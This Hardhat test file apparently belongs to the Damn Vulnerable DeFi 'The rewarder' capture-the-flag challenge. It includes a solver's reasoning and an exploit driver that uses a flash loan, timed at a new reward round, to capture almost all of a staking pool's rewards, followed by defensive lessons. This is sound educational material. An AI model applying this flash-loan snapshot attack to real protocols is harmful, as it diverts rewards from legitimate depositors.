const { ethers } = require('hardhat');
const { expect } = require('chai');


describe('[Challenge] The rewarder', function () {

    let deployer, alice, bob, charlie, david, attacker;
    let users;

    const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice, bob, charlie, david];

        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);

        this.liquidityToken = await DamnValuableTokenFactory.deploy();
        this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);

        // Set initial token balance of the pool offering flash loans
        await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
        this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
        this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (let i = 0; i < users.length; i++) {
            const amount = ethers.utils.parseEther('100');
            await this.liquidityToken.transfer(users[i].address, amount);
            await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
            await this.rewarderPool.connect(users[i]).deposit(amount);
            expect(
                await this.accountingToken.balanceOf(users[i].address)
            ).to.be.eq(amount);
        }
        expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
        expect(await this.rewardToken.totalSupply()).to.be.eq('0');

        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        
        // Each depositor gets 25 reward tokens
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

        // Attacker starts with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
        
        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('2');
    });

    it('Exploit', async function () {

        /** CODE YOUR EXPLOIT HERE */

        // Ok before I even read the code my first intinct is that I'll flashloan out a ton of DVT just at the moment of the snapshot
        // and then return it all immediately after the snapshot has taken place
        // I'm not 100% this would be possible, don't flashloans have to be repaid in the same tx? Let's dive in...

        // Would the code execution in the flashloan have msg.sender context as FlashLoanerPool (like in TrusterLenderPool)? Would this open anything up for access control?

        // So I can borrow DVT tokens from the FlashLoanerPool
        // Then deposit them in TheRewarderPool
        // This will mint me the accounting receipt tokens & call distributeRewards(), but at this point I don't think I'll be eligible
        // Would there be a way to withdraw my DVT tokens to repay the flashloan without having my accounting tokens burnt? 

        // If I could get isNewRewardsRound() to return true I could force a snapshot to be recorded during the distributeRewards() call as I deposit
        // It currently returns false, writing a script that constantly checks for it to flip to 'true' and 'snipe' the first request is theoretically possible
        // however in the real world surely there'd be competition for bots like this?

        // SOLUTION ===========================================================

        const RewarderAttackFactory = await ethers.getContractFactory('RewarderAttack', attacker);
        this.attackContract = await RewarderAttackFactory.connect(attacker).deploy(
            this.flashLoanPool.address,
            this.rewarderPool.address,
            this.liquidityToken.address,
            this.rewardToken.address
        );

        console.log("Is new reward round?", await this.rewarderPool.isNewRewardsRound()); // false

        // move time forward 5 days to new reward round, in reality I suppose I would use a bot here
        await network.provider.send("evm_increaseTime", [3600 * 24 * 5]) 
        await network.provider.send("evm_mine")

        console.log("Is new reward round?", await this.rewarderPool.isNewRewardsRound()); // true

        await this.attackContract.connect(attacker).requestFlashLoan();

        console.log("Is new reward round?", await this.rewarderPool.isNewRewardsRound()); // false

        // Lessons Learned ====================================================
        // - Snapshots that rely on particular moments in time without time weighting can be vulnerable to exploitation
        // - Keeping the time/date of your snapshots a secret is another way to mitigate this 

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Only one round should have taken place
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('3');

        // Users should get neglegible rewards this round
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            let rewards = await this.rewardToken.balanceOf(users[i].address);
            
            // The difference between current and previous rewards balance should be lower than 0.01 tokens
            let delta = rewards.sub(ethers.utils.parseEther('25'));
            expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
        }
        
        // Rewards must have been issued to the attacker account
        expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
        let rewards = await this.rewardToken.balanceOf(attacker.address);

        // The amount of rewards earned should be really close to 100 tokens
        let delta = ethers.utils.parseEther('100').sub(rewards);
        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

        // Attacker finishes with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
    });
});
